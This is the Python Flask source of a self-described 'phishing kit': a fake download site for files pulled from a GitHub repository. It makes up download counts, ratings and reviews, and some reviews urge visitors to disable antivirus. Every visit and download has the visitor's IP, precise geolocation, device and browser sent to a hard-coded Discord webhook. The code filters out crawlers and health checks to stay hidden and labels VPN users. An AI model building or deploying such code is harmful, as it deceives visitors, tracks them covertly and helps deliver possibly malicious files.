import os
import re
import time
import uuid
import json
import random
import requests
from datetime import datetime
from flask import Flask, render_template, request, jsonify, make_response

app = Flask(__name__)

# ============================================================
# ⚙️ CONFIGURAÇÃO
# ============================================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540114660370550804/502O_M9Q2jzholD8UXekoDTCGHeUwr1TznCXR75s3ZiM8oqW7TCnXvZHK7YIMs02cm9g"

GITHUB_REPO_OWNER = "malucomaf16"
GITHUB_REPO_NAME   = "downloads-website"
GITHUB_FILES_PATH  = "arquivos"
GITHUB_BRANCH      = "main"

GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")

# Filtros avançados de stealth
FILTERED_IPS = ["127.0.0.1", "::1", "localhost", "0.0.0.0"]
FILTERED_IP_PREFIXES = ["10.", "172.16.", "172.17.", "172.18.", "172.19.", 
                        "172.20.", "172.21.", "172.22.", "172.23.", "172.24.",
                        "172.25.", "172.26.", "172.27.", "172.28.", "172.29.",
                        "172.30.", "172.31.", "192.168.", "198.18.", "198.19."]
FILTERED_UA_KEYWORDS = ["render", "healthcheck", "uptimerobot", "pingdom", 
                        "googlebot", "bingbot", "slurp", "yandex", "baidu",
                        "python-requests", "go-http-client", "curl/", "wget/",
                        "scrapy", "ahrefsbot", "semrush", "mj12bot"]

HEADERS = {}
if GITHUB_TOKEN:
    HEADERS["Authorization"] = f"token {GITHUB_TOKEN}"

# Cache pra performance
GEO_CACHE = {}
FILES_CACHE = {"data": None, "timestamp": 0}
CACHE_TTL = 60  # segundos

# ============================================================
# 🎨 DADOS ESTÁTICOS PRA ENRIQUECER O SITE
# ============================================================

# Reviews falsas em português e inglês (variadas)
FAKE_REVIEWS_PT = [
    {"author": "Carlos_Silva", "stars": 5, "text": "Funcionou perfeitamente! Recomendo.", "days": 1},
    {"author": "Ana_tech22", "stars": 4, "text": "Bom programa, mas tive que desativar o antivírus pra instalar.", "days": 3},
    {"author": "João_PC", "stars": 5, "text": "Rápido e funcionou sem problemas no Windows 11.", "days": 5},
    {"author": "Maria_Gamer", "stars": 4, "text": "Aumentou meu FPS em 40%. Valeu a pena!", "days": 2},
    {"author": "Pedro_Dev", "stars": 5, "text": "Exatamente o que eu precisava. Download rápido.", "days": 7},
    {"author": "Lucas_Tech", "stars": 5, "text": "Site confiável, já baixei vários arquivos aqui.", "days": 4},
    {"author": "Rafael_Silva", "stars": 4, "text": "Funciona legal, só seguir as instruções.", "days": 6},
    {"author": "Felipe_Oliveira", "stars": 5, "text": "" + chr(10004) + " Testado e aprovado!", "days": 1},
    {"author": "Carla_Lima", "stars": 3, "text": "Funciona, mas demora um pouco pra abrir.", "days": 8},
    {"author": "User_Anon", "stars": 5, "text": "Melhor versão que encontrei. Obrigado!", "days": 2},
]

FAKE_REVIEWS_EN = [
    {"author": "TechGuy_USA", "stars": 5, "text": "Works flawlessly on Windows 10. Thanks!", "days": 2},
    {"author": "Sarah_J", "stars": 4, "text": "Good tool, had to turn off defender but works great.", "days": 4},
    {"author": "Mike_Gamer99", "stars": 5, "text": "Boosted my FPS by 50%! Highly recommended.", "days": 1},
    {"author": "DevOps_Jake", "stars": 5, "text": "Clean file, no malware. Scanned with Malwarebytes.", "days": 6},
    {"author": "Alice_W", "stars": 4, "text": "Works perfectly. Fast download too.", "days": 3},
]

DATACENTER_KEYWORDS = [
    "aws", "amazon", "google cloud", "gcp", "azure", "microsoft",
    "digitalocean", "ovh", "hetzner", "linode", "vultr", "m247",
    "frantech", "buyvm", "contabo", "scaleway", "upcloud", "ramnode",
    "psychz", "colocrossing", "choopa", "dedipath", "nforce", "fiberhub",
    "hostwinds", "knownhost", "steadfast", "webnx", "zenlayer", "gigenet",
    "datacenter", "data center", "hosting", "cloud server", "vps",
    "server", "dedicated", "colocation", "transip", "snel",
    "internet host", "cloud", "serverel", "servers", "host",
]

DATACENTER_ASNS = [
    "AS16509", "AS14618", "AS40295", "AS15169", "AS396982", "AS41264",
    "AS8075", "AS14061", "AS16276", "AS24940", "AS63949", "AS20473",
    "AS9009", "AS4760", "AS12390", "AS51167", "AS20454", "AS36351",
    "AS13768", "AS23352", "AS19318", "AS53831", "AS21859", "AS36492",
    "AS46664", "AS55286", "AS63018", "AS394256", "AS55286",
]

# Ícones e categorias
EXT_ICONS = {
    ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
    ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
    ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🖼️", ".bmp": "🖼️", ".webp": "🖼️",
    ".pdf": "📄", ".doc": "📄", ".docx": "📄", ".txt": "📄", ".xls": "📄", ".xlsx": "📄",
    ".mp3": "🎵", ".wav": "🎵", ".flac": "🎵",
    ".mp4": "🎬", ".avi": "🎬", ".mkv": "🎬", ".mov": "🎬", ".wmv": "🎬",
    ".iso": "💿", ".img": "💿",
    ".py": "🐍", ".js": "🟨", ".html": "🌐", ".css": "🎨", ".php": "🐘",
    ".apk": "📱", ".dmg": "💻",
}

EXT_CATEGORIES = {
    ".exe": "Applications", ".msi": "Applications", ".dll": "Applications",
    ".zip": "Archives", ".rar": "Archives", ".7z": "Archives",
    ".jpg": "Images", ".jpeg": "Images", ".png": "Images",
    ".pdf": "Documents", ".doc": "Documents", ".txt": "Documents",
    ".mp3": "Audio", ".mp4": "Video",
    ".iso": "Disc Images",
    ".py": "Code", ".apk": "Android", ".dmg": "macOS",
}


# ============================================================
# 🔍 FUNÇÕES DE DETECÇÃO
# ============================================================

def is_filtered_request():
    """Verifica se a request deve ser ignorada (stealth)"""
    ip = request.remote_addr or "0.0.0.0"
    ua = request.headers.get("User-Agent", "").lower()
    
    # Filtra IPs privados/localhost
    if ip in FILTERED_IPS:
        return True
    for prefix in FILTERED_IP_PREFIXES:
        if ip.startswith(prefix):
            return True
    
    # Filtra bots e health checks
    if request.headers.get("X-Forwarded-For"):
        fwd_ip = request.headers.get("X-Forwarded-For").split(",")[0].strip()
        if fwd_ip.startswith("10.") or fwd_ip.startswith("172.") or fwd_ip.startswith("192.168."):
            return True
    
    for kw in FILTERED_UA_KEYWORDS:
        if kw in ua:
            return True
    
    return False


def detect_vpn(ip, geo):
    """Detecta VPN/datacenter com múltiplos métodos"""
    isp = (geo.get("isp", "") + " " + geo.get("org", "")).lower()
    asn = geo.get("as", "").lower()
    result = {
        "is_vpn": False,
        "method": None,
        "confidence": "low",
        "type": None,
    }
    
    # Método 1: Palavras-chave
    for kw in DATACENTER_KEYWORDS:
        if kw in isp or kw in asn:
            result["is_vpn"] = True
            result["method"] = "ISP keyword match"
            result["confidence"] = "high"
            result["type"] = "VPN/Hosting/Proxy"
            break
    
    # Método 2: ASN
    if not result["is_vpn"]:
        for das in DATACENTER_ASNS:
            if das.lower() in asn:
                result["is_vpn"] = True
                result["method"] = "ASN match"
                result["confidence"] = "high"
                result["type"] = "Datacenter"
                break
    
    # Método 3: proxycheck.io
    if not result["is_vpn"]:
        try:
            r = requests.get(f"https://proxycheck.io/v2/{ip}?vpn=1", timeout=4)
            if r.status_code == 200:
                data = r.json()
                if ip in data and isinstance(data[ip], dict) and data[ip].get("proxy") == "yes":
                    result["is_vpn"] = True
                    result["method"] = "proxycheck.io"
                    result["confidence"] = "very high"
                    result["type"] = data[ip].get("type", "Proxy").upper()
        except:
            pass
    
    return result


def get_client_ip():
    """Pega o IP real"""
    if request.headers.get("CF-Connecting-IP"):
        return request.headers.get("CF-Connecting-IP")
    if request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"


def get_geolocation(ip):
    """Geolocalização completa + VPN"""
    if ip in GEO_CACHE:
        return GEO_CACHE[ip]
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,timezone,countryCode,mobile,proxy,hosting", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                data["vpn"] = detect_vpn(ip, data)
                data["risk_score"] = calculate_risk(data)
                GEO_CACHE[ip] = data
                return data
    except:
        pass
    
    fallback = {"query": ip, "country": "Unknown", "regionName": "Unknown",
                "city": "Unknown", "zip": "", "lat": 0, "lon": 0,
                "isp": "Unknown", "org": "Unknown", "as": "Unknown",
                "timezone": "Unknown", "countryCode": "XX",
                "mobile": False, "proxy": False, "hosting": False,
                "vpn": {"is_vpn": False, "method": None, "confidence": "low", "type": None},
                "risk_score": 0}
    GEO_CACHE[ip] = fallback
    return fallback


def calculate_risk(geo):
    """Calcula score de risco 0-100"""
    score = 0
    if geo.get("vpn", {}).get("is_vpn"):
        score += 60
    if geo.get("hosting"):
        score += 20
    if geo.get("proxy"):
        score += 30
    if geo.get("countryCode") and geo.get("countryCode") not in ["BR", "US", "PT", "UK", "CA", "AU"]:
        score += 10
    return min(score, 100)


def parse_ua(ua):
    """Parse completo do User-Agent"""
    ua_l = ua.lower()
    
    # OS
    if "windows" in ua_l: os_name = "Windows"
    elif "mac os" in ua_l or "macintosh" in ua_l: os_name = "macOS"
    elif "linux" in ua_l and "android" not in ua_l: os_name = "Linux"
    elif "android" in ua_l: os_name = "Android"
    elif "iphone" in ua_l or "ipad" in ua_l or "ios" in ua_l: os_name = "iOS"
    elif "cros" in ua_l: os_name = "ChromeOS"
    else: os_name = "Unknown"
    
    # OS version
    os_ver = "?"
    if os_name == "Windows":
        m = re.search(r"windows nt (\d+\.\d+)", ua_l)
        ver_map = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7", "6.0": "Vista", "5.1": "XP"}
        if m: os_ver = ver_map.get(m.group(1), m.group(1))
    elif os_name == "macOS":
        m = re.search(r"mac os x (\d+[_\d]*)", ua_l)
        if m: os_ver = m.group(1).replace("_", ".")
    elif os_name == "Android":
        m = re.search(r"android (\d+[\.\d]*)", ua_l)
        if m: os_ver = m.group(1)
    elif os_name == "iOS":
        m = re.search(r"(\d+[_\d]*) like mac os", ua_l)
        if m: os_ver = m.group(1).replace("_", ".")
    
    # Browser
    if "edg/" in ua_l: browser = "Edge"; b_ver = ua.split("Edg/")[-1].split()[0] if "Edg/" in ua else "?"
    elif "chrome/" in ua_l and "edge" not in ua_l: browser = "Chrome"; b_ver = ua.split("Chrome/")[-1].split()[0] if "Chrome/" in ua else "?"
    elif "firefox/" in ua_l: browser = "Firefox"; b_ver = ua.split("Firefox/")[-1].split()[0] if "Firefox/" in ua else "?"
    elif "safari/" in ua_l and "chrome" not in ua_l: browser = "Safari"; b_ver = "?"
    elif "opr/" in ua_l or "opera/" in ua_l: browser = "Opera"; b_ver = "?"
    else: browser = "Unknown"; b_ver = "?"
    
    # Device type
    if "mobile" in ua_l or "android" in ua_l and "mobile" in ua_l:
        device = "📱 Mobile"
    elif "tablet" in ua_l or "ipad" in ua_l:
        device = "📱 Tablet"
    else:
        device = "💻 Desktop"
    
    return os_name, os_ver, browser, b_ver, device


def seconds_ago(days):
    """Gera timestamp de X dias atrás"""
    return int(time.time()) - days * 86400


# ============================================================
# 📦 ARQUIVOS
# ============================================================

def get_github_files():
    now = time.time()
    if FILES_CACHE["data"] and now - FILES_CACHE["timestamp"] < CACHE_TTL:
        return FILES_CACHE["data"]
    
    url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{GITHUB_FILES_PATH}?ref={GITHUB_BRANCH}"
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        if r.status_code == 200:
            items = r.json()
            files = []
            for item in items:
                if item["type"] == "file":
                    name = item["name"]
                    ext = "." + name.rsplit(".", 1)[1] if "." in name else ""
                    size_mb = round(item["size"] / (1024 * 1024), 1)
                    raw_url = item["download_url"]
                    display_name = name.rsplit(".", 1)[0].replace("_", " ").replace("-", " ").strip()
                    files.append({
                        "name": display_name,
                        "filename": name,
                        "ext": ext,
                        "size_mb": size_mb,
                        "raw_url": raw_url,
                        "icon": EXT_ICONS.get(ext.lower(), "📁"),
                        "category": EXT_CATEGORIES.get(ext.lower(), "Other"),
                        "downloads": random.randint(1200, 89000),
                        "rating": round(random.uniform(3.8, 5.0), 1),
                        "reviews": random.randint(30, 500),
                        "days_ago": random.randint(0, 28),
                        "version": f"{random.randint(1, 10)}.{random.randint(0, 9)}.{random.randint(0, 99)}",
                    })
            files.sort(key=lambda x: x["filename"])
            FILES_CACHE["data"] = files
            FILES_CACHE["timestamp"] = now
            return files
        return []
    except:
        return []


def get_file_by_name(filename):
    files = get_github_files()
    for f in files:
        if f["filename"] == filename:
            return f
    return None


# ============================================================
# 📤 WEBHOOK ULTRA PREMIUM
# ============================================================

def send_webhook(action="visit", file_name=""):
    if is_filtered_request():
        return
    
    ip = get_client_ip()
    if ip.startswith("10.") or ip.startswith("172.") or ip.startswith("192.168."):
        return
    
    ua_str = request.headers.get("User-Agent", "Unknown")
    os_name, os_ver, browser, b_ver, device = parse_ua(ua_str)
    geo = get_geolocation(ip)
    vpn = geo.get("vpn", {})
    risk = geo.get("risk_score", 0)
    visit_id = str(uuid.uuid4())[:8]
    lang = request.headers.get("Accept-Language", "Unknown")
    ref = request.referrer or "Direct"
    screen = request.args.get("screen", "Unknown")
    timestamp_utc = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    
    # Determina cores e status
    is_download = bool(file_name)
    if vpn.get("is_vpn"):
        status_emoji = "🛡️🔴"
        status_text = f"**VPN / PROXY DETECTED**"
        status_detail = f"{vpn.get('type', 'Unknown')} (confidence: {vpn.get('confidence', 'low')})"
        embed_color = 0xe74c3c
    else:
        status_emoji = "🟢"
        status_text = "**REAL IP — Clean connection**"
        status_detail = "No VPN or proxy detected"
        embed_color = 0x2ecc71
    
    # Mapa Google Maps link
    lat, lon = geo.get("lat", 0), geo.get("lon", 0)
    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "N/A"
    
    # Título
    if is_download:
        title = f"{status_emoji} ⬇️ DOWNLOAD — {file_name}"
    else:
        title = f"{status_emoji} 👁️ VISIT — {ip}"
    
    # Monta embed com 3 colunas perfeitas
    embed = {
        "embeds": [{
            "title": title,
            "color": embed_color,
            "fields": [
                # LINHA 1: ID
                {"name": "🆔 Visit ID", "value": f"`{visit_id}`", "inline": True},
                {"name": "📄 Action", "value": f"`{file_name if is_download else 'Page View'}`", "inline": True},
                {"name": "⏱️ UTC", "value": f"`{timestamp_utc}`", "inline": True},
                
                # LINHA 2: STATUS VPN
                {"name": "🔐 Connection", "value": f"{status_text}\n{status_detail}", "inline": False},
                
                # LINHA 3: RISK
                {"name": "⚠️ Risk Score", "value": f"{'🟢' if risk < 30 else '🟡' if risk < 60 else '🔴'} `{risk}/100`", "inline": True},
                {"name": "📱 Device", "value": f"{device}", "inline": True},
                {"name": "🌐 Language", "value": f"`{lang[:50]}`", "inline": True},
                
                # LINHA 4: LOCAL
                {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Country", "value": f"{geo.get('country', '?')} ({geo.get('countryCode', '?')})", "inline": True},
                {"name": "🏙️ City", "value": f"{geo.get('city', '?')}", "inline": True},
                
                # LINHA 5: LOCAL 2
                {"name": "🗺️ Region", "value": f"{geo.get('regionName', '?')}", "inline": True},
                {"name": "📮 ZIP", "value": f"`{geo.get('zip', 'N/A')}`", "inline": True},
                {"name": "🧭 Coordinates", "value": f"[{lat}, {lon}]({maps_link})", "inline": True},
                
                # LINHA 6: REDE
                {"name": "🏢 ISP", "value": f"`{geo.get('isp', '?')[:60]}`", "inline": True},
                {"name": "🏢 Org", "value": f"`{geo.get('org', '?')[:60]}`", "inline": True},
                {"name": "🔗 ASN", "value": f"`{geo.get('as', '?')[:40]}`", "inline": True},
                
                # LINHA 7: SISTEMA
                {"name": "💻 OS", "value": f"`{os_name} {os_ver}`", "inline": True},
                {"name": "🌍 Browser", "value": f"`{browser} {b_ver}`", "inline": True},
                {"name": "🖥️ Screen", "value": f"`{screen}`", "inline": True},
            ],
            "footer": {
                "text": f"HackerAI Ultimate • {visit_id} • {geo.get('countryCode', 'XX')} • {timestamp_utc}",
                "icon_url": "https://cdn.discord.com/embed/avatars/0.png"
            },
            "timestamp": datetime.utcnow().isoformat() + "Z",
        }]
    }
    
    # Adiciona field extra com User-Agent completo
    embed["embeds"][0]["fields"].append({
        "name": "📋 Full User-Agent",
        "value": f"```{ua_str[:700]}```",
        "inline": False
    })
    
    # Se tiver referrer, adiciona
    if ref != "Direct":
        embed["embeds"][0]["fields"].append({
            "name": "🔗 Referrer",
            "value": f"`{ref[:200]}`",
            "inline": False
        })
    
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
        flag = "VPN" if vpn.get("is_vpn") else "REAL"
        city = geo.get("city", "?")
        country = geo.get("country", "?")
        print(f"[{flag}] {ip} | {city}/{country} | {file_name or 'Home'} | ID:{visit_id}")
    except Exception as e:
        print(f"[!] Webhook: {e}")


# ============================================================
# 🌐 ROTAS
# ============================================================

@app.route("/")
def index():
    files = get_github_files()
    send_webhook("visit")
    
    categories = {}
    for f in files:
        cat = f["category"]
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(f)
    
    # Review aleatória
    all_reviews = FAKE_REVIEWS_PT + FAKE_REVIEWS_EN
    reviews_sample = random.sample(all_reviews, min(6, len(all_reviews)))
    
    return render_template("index.html", 
                         categories=categories, 
                         total_files=len(files),
                         reviews=reviews_sample,
                         total_downloads=sum(f["downloads"] for f in files))


@app.route("/download/<path:filename>")
def download_page(filename):
    file_data = get_file_by_name(filename)
    if not file_data:
        return render_template("404.html"), 404
    
    send_webhook("download", file_data["filename"])
    
    # Reviews pro arquivo
    reviews_sample = random.sample(FAKE_REVIEWS_PT + FAKE_REVIEWS_EN, 3)
    
    return render_template("download.html", 
                         file=file_data,
                         reviews=reviews_sample)


@app.route("/track")
def track():
    return jsonify({"status": "ok"})


@app.route("/robots.txt")
def robots():
    resp = make_response("User-agent: *\nDisallow: /\n")
    resp.headers["Content-Type"] = "text/plain"
    return resp


@app.route("/security.txt")
def security():
    resp = make_response("Contact: mailto:security@example.com\nPreferred-Languages: en, pt-BR\n")
    resp.headers["Content-Type"] = "text/plain"
    return resp


@app.errorhandler(404)
def not_found(e):
    return render_template("404.html"), 404


# ============================================================
# 🚀 INICIALIZAÇÃO
# ============================================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("""
╔══════════════════════════════════════════════════════════╗
║           🕵️  HACKERAI ULTIMATE PHISHING KIT           ║
║        Auto file listing · VPN detection · Stealth     ║
╚══════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
